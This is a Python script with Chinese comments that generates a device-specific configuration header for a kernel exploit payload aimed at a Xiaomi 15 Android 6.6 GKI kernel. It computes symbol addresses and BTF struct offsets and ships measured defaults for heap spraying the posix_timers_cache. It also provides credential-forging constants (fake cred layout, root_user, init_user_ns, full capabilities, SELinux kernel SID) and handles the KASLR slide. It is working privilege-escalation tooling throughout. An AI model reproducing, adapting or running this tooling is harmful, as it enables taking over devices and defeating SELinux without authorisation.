#!/usr/bin/env python3
"""gen-config.py - 从 kallsyms / BTF / 实测值生成 payload/src/device_config.h

为什么需要它: payload 里的常量一半来自内核镜像（符号地址、结构体偏移），
一半只能在设备上实测（tracepoint id、kmem_cache_alloc 的 call site、
task_struct 的 bytes_req）。手抄一遍很容易漏，换固件后更难查。这个脚本把
前一半自动算出来，后一半从 measurements.json 读，最后产出一个可直接编译的头文件。

用法:
    python3 tools/gen-config.py \
        --kallsyms kallsyms.txt \
        --btf vmlinux.btf \
        --measure measurements.json \
        --out payload/src/device_config.h

    # 只看结果不写文件
    python3 tools/gen-config.py --kallsyms ... --btf ... --print

    # 用内置的 dada / AAK-AN00 基线（没有镜像在手时对照格式）
    python3 tools/gen-config.py --preset dada --print

输入格式:
  kallsyms.txt   `kallsyms_dump.py` 的输出，每行 "<hex addr> <name>"
                 （也接受 System.map 风格 "<hex addr> <type> <name>"）
  vmlinux.btf    raw BTF（magic 0xeb9f），从 boot.img 的 kernel 段里取
  measurements   JSON，见 DEFAULTS；缺的字段用默认值补

退出码: 0 正常 / 2 缺少必需符号 / 3 结构体布局与代码假设不符（需人工改代码）
"""
from __future__ import annotations

import argparse
import hashlib
import json
import pathlib
import struct
import sys
import time

MAGIC_BTF = 0xEB9F

# ---------------------------------------------------------------- 实测默认值
# 这些是 dada（小米 15 / 6.6.118 android15-8 GKI）上的实测结果，仅作基线：
# 换机型/换固件必须重新测，尤其 EV_* 和三个 call site。
DEFAULTS: dict = {
    "kernel_release": "6.6.118-android15-8-g93e223c276e7-abogki500782043-4k",
    "ev": {
        "cache_alloc": 269,
        "cache_free": 272,
        "page_free": 273,
        "page_alloc": 275,
        "pcpu_drain": 277,
    },
    # do_timer_create 里 kmem_cache_alloc 的 _RET_IP_ 相对函数入口的偏移
    "timer_site_offset": 0x94,
    # prepare_creds+0x20 的 _RET_IP_ low21
    "cred_site_low21": 0x38458,
    "cred_req": 0xB8,
    "cred_alloc": 0xC0,
    # copy_process 里 task_struct 那次分配的 _RET_IP_ low21 与 bytes_req
    "task_alloc_low21": 0x1CB240,
    "task_alloc_bytes": 0x12C0,
    "task_alloc_round": None,  # None = 与 bytes 相同
    # posix_timers_cache: 每 slab 对象数 / 用来填满 partial slab 的 slab 数
    "objects_per_slab": 31,
    "padding_slabs": 150,
    "ntimers": 4096,
    "victim_idx": 2048,
    "lockers": 3,
    "vma_count": 50000,
    "selinux_blob_off": 0x8,
    "selinux_sid_kernel": 1,
}

# 需要从 kallsyms 里解析的符号 → 生成的宏名
SYMBOLS = [
    ("do_timer_create", "__DO_TIMER_CREATE"),
    ("selinux_state", "SELINUX_STATE_STATIC"),
    ("panic_on_warn", "PANIC_ON_WARN_STATIC"),
    ("root_user", "ROOT_USER_STATIC"),
    ("init_user_ns", "INIT_USER_NS_STATIC"),
    ("init_ucounts", "INIT_UCOUNTS_STATIC"),
    ("init_groups", "INIT_GROUPS_STATIC"),
]

LOW21_MASK = 0x1FFFFF


# ------------------------------------------------------------------ kallsyms
def load_kallsyms(path: pathlib.Path) -> dict[str, int]:
    syms: dict[str, int] = {}
    for line in path.read_text(encoding="utf-8", errors="replace").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split()
        if len(parts) < 2:
            continue
        try:
            addr = int(parts[0], 16)
        except ValueError:
            continue
        name = parts[-1] if len(parts) >= 3 and len(parts[1]) == 1 else parts[1]
        syms.setdefault(name, addr)
    return syms


# ----------------------------------------------------------------------- BTF
KIND_EXTRA = {
    0: lambda vlen: 0,     # void
    1: lambda vlen: 4,     # int
    2: lambda vlen: 0,     # ptr
    3: lambda vlen: 12,    # array
    4: lambda vlen: 12 * vlen,   # struct
    5: lambda vlen: 12 * vlen,   # union
    6: lambda vlen: 8 * vlen,    # enum
    7: lambda vlen: 0,     # fwd
    8: lambda vlen: 0,     # typedef
    9: lambda vlen: 0,     # volatile
    10: lambda vlen: 0,    # const
    11: lambda vlen: 0,    # restrict
    12: lambda vlen: 0,    # func
    13: lambda vlen: 8 * vlen,   # func_proto
    14: lambda vlen: 4,    # var
    15: lambda vlen: 12 * vlen,  # datasec
    16: lambda vlen: 0,    # float
    17: lambda vlen: 4,    # decl_tag
    18: lambda vlen: 0,    # type_tag
    19: lambda vlen: 12 * vlen,  # enum64
}


class Btf:
    def __init__(self, raw: bytes):
        magic, _ver, _flags, hdr_len, type_off, type_len, str_off, str_len = \
            struct.unpack_from("<HBBIIIII", raw, 0)
        if magic != MAGIC_BTF:
            raise ValueError(f"不是 BTF（magic={magic:#x}）")
        types = raw[hdr_len + type_off: hdr_len + type_off + type_len]
        self.strs = raw[hdr_len + str_off: hdr_len + str_off + str_len]
        self.types: list[dict | None] = [None]
        off = 0
        while off + 12 <= len(types):
            name_off, info, size_type = struct.unpack_from("<III", types, off)
            off += 12
            kind = (info >> 24) & 0x1F
            vlen = info & 0xFFFF
            kflag = (info >> 31) & 1
            ent = {
                "name": self.str(name_off),
                "kind": kind,
                "vlen": vlen,
                "size": size_type,
                "members": [],
                "id": len(self.types),
            }
            for _ in range(vlen if kind in (4, 5, 6, 13, 15, 19) else 0):
                if kind in (4, 5):
                    mo, mt, mof = struct.unpack_from("<III", types, off)
                    off += 12
                    if kflag:
                        bit_off = mof & 0xFFFFFF
                    else:
                        bit_off = mof
                    ent["members"].append((self.str(mo), mt, bit_off))
                elif kind in (6, 13):
                    off += 8
                elif kind in (15, 19):
                    off += 12
            extra = KIND_EXTRA.get(kind, lambda vlen: 0)(vlen)
            # 上面已经消费过的部分不再重复推进
            consumed = 0
            if kind in (4, 5):
                consumed = vlen * 12
            elif kind in (6, 13):
                consumed = vlen * 8
            elif kind in (15, 19):
                consumed = vlen * 12
            off += extra - consumed
            self.types.append(ent)

    def str(self, off: int) -> str:
        if off == 0:
            return ""
        end = self.strs.find(b"\0", off)
        return self.strs[off:end].decode("utf-8", "replace")

    def find(self, kind: int, name: str) -> dict | None:
        for t in self.types:
            if t and t["kind"] == kind and t["name"] == name:
                return t
        return None

    def struct(self, name: str) -> dict:
        t = self.find(4, name) or self.find(5, name)
        if t is None:
            raise KeyError(f"BTF 里找不到 struct {name}")
        return t

    def member_offset(self, struct_name: str, member: str) -> int:
        """按名字取偏移。BFS 逐层下探，取最先命中的那个（最浅即最可靠）。"""
        root = self.struct(struct_name)
        frontier = [(root["id"], 0)]
        seen: set[int] = set()
        for _depth in range(6):
            nxt = []
            for tid, base in frontier:
                if tid in seen:
                    continue
                seen.add(tid)
                t = self.types[tid] if tid < len(self.types) else None
                if not t or t["kind"] not in (4, 5):
                    continue
                for mname, mtype, bit_off in t["members"]:
                    off = base + bit_off // 8
                    if mname == member:
                        return off
                    nxt.append((mtype, off))
            frontier = nxt
            if not frontier:
                break
        raise KeyError(f"{struct_name} 里找不到成员 {member}")


# ------------------------------------------------------------------ measure
def _coerce(v):
    """JSON 里 0x94 / "0x94" / 148 都接受；非数字（如 kernel_release）原样返回。"""
    if isinstance(v, str):
        try:
            return int(v, 0)
        except ValueError:
            return v
    return v


def load_measure(path: pathlib.Path | None) -> dict:
    m = json.loads(json.dumps(DEFAULTS))  # deep copy
    if path is not None:
        data = json.loads(path.read_text(encoding="utf-8"))
        for k, v in data.items():
            if k == "ev" and isinstance(v, dict):
                m["ev"].update({ek: _coerce(ev) for ek, ev in v.items()})
            else:
                m[k] = v
    for k, v in list(m.items()):
        if k == "ev":
            m["ev"] = {ek: _coerce(ev) for ek, ev in v.items()}
        elif v is not None:
            m[k] = _coerce(v)
    return m


def sha256_of(path: pathlib.Path | None) -> str:
    if path is None or not path.is_file():
        return "-"
    h = hashlib.sha256()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


# ------------------------------------------------------------------- render
def render(syms, btf, m, args) -> tuple[str, list[str], list[str]]:
    warn: list[str] = []
    errors: list[str] = []

    # --- 符号
    values: dict[str, int] = {}
    for name, macro in SYMBOLS:
        addr = syms.get(name)
        if addr is None:
            errors.append(f"kallsyms 缺少符号 {name}")
            addr = 0
        values[macro] = addr
    if errors and not args.allow_missing:
        return "", warn, errors

    timer_site = (values["__DO_TIMER_CREATE"] + int(m["timer_site_offset"])) & 0xFFFFFFFFFFFFFFFF
    values["STATIC_TIMER_SITE"] = timer_site
    values["TIMER_SITE_LOW21"] = timer_site & LOW21_MASK

    # --- 结构体
    try:
        ki = btf.struct("k_itimer")
        ts = btf.struct("task_struct")
        cr = btf.struct("cred")
    except KeyError as e:
        return "", warn, [str(e)]

    itimer_size = ki["size"]
    itimer_node = btf.member_offset("k_itimer", "node")
    head = btf.member_offset("k_itimer", "head")
    elist = btf.member_offset("k_itimer", "elist")
    firing = btf.member_offset("k_itimer", "firing")
    handling = btf.member_offset("k_itimer", "handling")
    task_cred = btf.member_offset("task_struct", "cred")
    task_comm = btf.member_offset("task_struct", "comm")
    cred_size = cr["size"]
    cred_uid = btf.member_offset("cred", "uid")
    cred_security = btf.member_offset("cred", "security")
    cred_user = btf.member_offset("cred", "user")
    cred_ns = btf.member_offset("cred", "user_ns")
    cred_uc = btf.member_offset("cred", "ucounts")
    cred_grp = btf.member_offset("cred", "group_info")

    # --- 一致性检查（决定要不要拦住）
    if cred_uid != 8:
        msg = (f"cred.uid 偏移是 {cred_uid}，而 build_fake_cred() 假设 usage 8 字节、uid@8；"
               f"5.15/6.1 这类 KMI 需要人工改代码")
        if args.allow_layout_mismatch:
            warn.append(msg)
        else:
            errors.append(msg)
    if cred_size != int(m["cred_req"]):
        warn.append(f"cred size {cred_size:#x} 与实测 cred_req {int(m['cred_req']):#x} 不一致")

    if errors:
        return "", warn, errors

    padding = int(m["padding_slabs"]) * int(m["objects_per_slab"])
    task_round = m["task_alloc_round"] if m["task_alloc_round"] is not None else m["task_alloc_bytes"]
    ts_size = ts["size"]

    def h(v: int) -> str:
        return f"{v:#x}"

    body = f"""/*
 * device_config.h - 机型相关常量（由 tools/gen-config.py 生成，不要手改）
 *
 * kernel_release : {m['kernel_release']}
 * generated_at   : {time.strftime('%Y-%m-%d %H:%M:%S')}
 * kallsyms sha256: {sha256_of(args.kallsyms)}
 * btf      sha256: {sha256_of(args.btf)}
 * measure  sha256: {sha256_of(args.measure)}
 *
 * 来源拆分:
 *   - 符号地址 / 结构体偏移：从上面两个镜像文件算出来
 *   - EV_* / call site / bytes_req：只能在设备上实测（measurements.json）
 *   - KASLR slide 不在这里，运行时从 do_timer_create 的 call site 反推
 */
#ifndef DEVICE_CONFIG_H
#define DEVICE_CONFIG_H

/* ---- kmem tracepoint event id（每个 build 都变，必须实测） ---- */
#define EV_CACHE_ALLOC {m['ev']['cache_alloc']}
#define EV_CACHE_FREE {m['ev']['cache_free']}
#define EV_PAGE_FREE {m['ev']['page_free']}
#define EV_PAGE_ALLOC {m['ev']['page_alloc']}
#define EV_PCPU_DRAIN {m['ev']['pcpu_drain']}

/* ---- kmem_cache_alloc / mm_page_alloc / mm_page_free 记录字段偏移（稳定） ---- */
#define OFF_SITE 8
#define OFF_PTR 16
#define OFF_REQ 24
#define OFF_ALLOC 32
#define OFF_PFN 8
#define OFF_ORDER 16

/* ---- struct k_itimer（BTF） ---- */
#define ITIMER_SIZE {h(itimer_size)}
#define ITIMER_NODE {h(itimer_node)}
#define ITIMER_HEAD {h(head)}
#define ITIMER_ELIST {h(elist)}
#define ITIMER_FIRING {h(firing)}
#define ITIMER_HANDLING {h(handling)}
#define TIMER_OBJ {h(itimer_size)}

/* ---- posix_timers_cache 堆喷整形（SLUB 行为，需实测） ---- */
#define PADDING_TIMERS ({int(m['padding_slabs'])} * {int(m['objects_per_slab'])})
#define NTIMERS {int(m['ntimers'])}
#define VICTIM_IDX {int(m['victim_idx'])}
#define LOCKERS {int(m['lockers'])}
#define VMA_COUNT {int(m['vma_count'])}UL
#define HELPER_STACK (1UL << 20)

/* ---- cred_jar（实测 bytes_req / bytes_alloc / call site） ---- */
#define CRED_REQ {h(int(m['cred_req']))}
#define CRED_ALLOC {h(int(m['cred_alloc']))}
#define CRED_SITE_LOW21 {h(int(m['cred_site_low21']))}UL

/* ---- 链接期地址（kallsyms）与运行时 slide 基准 ---- */
#define STATIC_TIMER_SITE {h(values['STATIC_TIMER_SITE'])}ULL	/* do_timer_create+{h(int(m['timer_site_offset']))} */
#define TIMER_SITE_LOW21 {h(values['TIMER_SITE_LOW21'])}UL

#define SELINUX_STATE_STATIC {h(values['SELINUX_STATE_STATIC'])}ULL
#define PANIC_ON_WARN_STATIC {h(values['PANIC_ON_WARN_STATIC'])}ULL
#define ROOT_USER_STATIC {h(values['ROOT_USER_STATIC'])}ULL
#define INIT_USER_NS_STATIC {h(values['INIT_USER_NS_STATIC'])}ULL
#define INIT_UCOUNTS_STATIC {h(values['INIT_UCOUNTS_STATIC'])}ULL
#define INIT_GROUPS_STATIC {h(values['INIT_GROUPS_STATIC'])}ULL

/* ---- task_struct（BTF + 实测） ---- */
#define OFF_TASK_CRED {h(task_cred)}ULL
#define OFF_TASK_COMM {h(task_comm)}ULL
#define TASK_ALLOC_LOW21 {h(int(m['task_alloc_low21']))}UL
#define TASK_ALLOC_BYTES {h(int(m['task_alloc_bytes']))}ULL
#define TASK_ALLOC_ROUND {h(int(task_round))}ULL

/* ---- struct cred 布局（BTF） ---- */
#define CRED_UID_OFF {h(cred_uid)}ULL
#define CRED_OFF_SECURITY {h(cred_security)}ULL
#define CRED_OFF_USER {h(cred_user)}ULL
#define CRED_OFF_USER_NS {h(cred_ns)}ULL
#define CRED_OFF_UCOUNTS {h(cred_uc)}ULL
#define CRED_OFF_GROUPS {h(cred_grp)}ULL
#define CRED_BLOB_OFF 0x1f00UL
#define SELINUX_BLOB_OFF {h(int(m['selinux_blob_off']))}ULL
#define SELINUX_SID_KERNEL {int(m['selinux_sid_kernel'])}U
#define FULLCAP 0x1ffffffffffULL

#endif /* DEVICE_CONFIG_H */
"""
    notes = [
        f"task_struct size = {ts_size:#x}（仅供参考，TASK_ALLOC_BYTES 用实测值）",
    ]
    return body, warn, notes


def main() -> int:
    for stream in (sys.stdout, sys.stderr):
        runc = getattr(stream, "reconfigure", None)
        if runc:
            runc(encoding="utf-8")
    ap = argparse.ArgumentParser(description="生成 payload/src/device_config.h")
    ap.add_argument("--kallsyms", type=pathlib.Path)
    ap.add_argument("--btf", type=pathlib.Path)
    ap.add_argument("--measure", type=pathlib.Path)
    ap.add_argument("--out", type=pathlib.Path)
    ap.add_argument("--preset", choices=["dada"], help="没有镜像时打印基线（不解析输入）")
    ap.add_argument("--print", action="store_true", dest="to_stdout")
    ap.add_argument("--allow-missing", action="store_true", help="缺符号时按 0 生成")
    ap.add_argument("--allow-layout-mismatch", action="store_true",
                    help="cred 布局与代码假设不符时仍然生成")
    ap.add_argument("--timer-site-offset", type=lambda s: int(s, 0),
                    help="覆盖 do_timer_create 内 call site 偏移（默认 0x94）")
    args = ap.parse_args()

    if args.preset:
        m = load_measure(None)
        # 基线里的符号地址直接写死，便于对照格式
        fake_syms = {
            "do_timer_create": 0xFFFFFFC0803AFC58,
            "selinux_state": 0xFFFFFFC0823BA418,
            "panic_on_warn": 0xFFFFFFC08216AE0C,
            "root_user": 0xFFFFFFC08218F228,
            "init_user_ns": 0xFFFFFFC08218EF98,
            "init_ucounts": 0xFFFFFFC082190CF8,
            "init_groups": 0xFFFFFFC082190788,
        }
        print("# preset=dada（符号地址来自 dada 的 kallsyms，结构体偏移用默认值）")
        for name, macro in SYMBOLS:
            print(f"{macro} = {fake_syms[name]:#x}")
        print(f"timer_site = {fake_syms['do_timer_create'] + int(m['timer_site_offset']):#x}")
        print(f"low21      = {(fake_syms['do_timer_create'] + int(m['timer_site_offset'])) & LOW21_MASK:#x}")
        return 0

    if not args.kallsyms or not args.btf:
        ap.error("需要 --kallsyms 和 --btf（或用 --preset dada 只看基线）")

    if args.timer_site_offset is not None:
        DEFAULTS["timer_site_offset"] = args.timer_site_offset

    syms = load_kallsyms(args.kallsyms)
    raw = args.btf.read_bytes()
    try:
        btf = Btf(raw)
    except Exception as exc:  # noqa: BLE001
        print(f"error: 解析 BTF 失败：{exc}", file=sys.stderr)
        return 1
    m = load_measure(args.measure)
    if args.timer_site_offset is not None:
        m["timer_site_offset"] = args.timer_site_offset

    body, warns, notes_or_errors = render(syms, btf, m, args)
    if not body:
        for e in notes_or_errors:
            print(f"error: {e}", file=sys.stderr)
        for w in warns:
            print(f"warn: {w}", file=sys.stderr)
        return 3 if any("cred.uid" in e for e in notes_or_errors) else 2

    for w in warns:
        print(f"warn: {w}", file=sys.stderr)
    for n in notes_or_errors:
        print(f"note: {n}", file=sys.stderr)

    if args.to_stdout or not args.out:
        print(body)
    else:
        args.out.parent.mkdir(parents=True, exist_ok=True)
        args.out.write_text(body, encoding="utf-8")
        print(f"wrote {args.out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
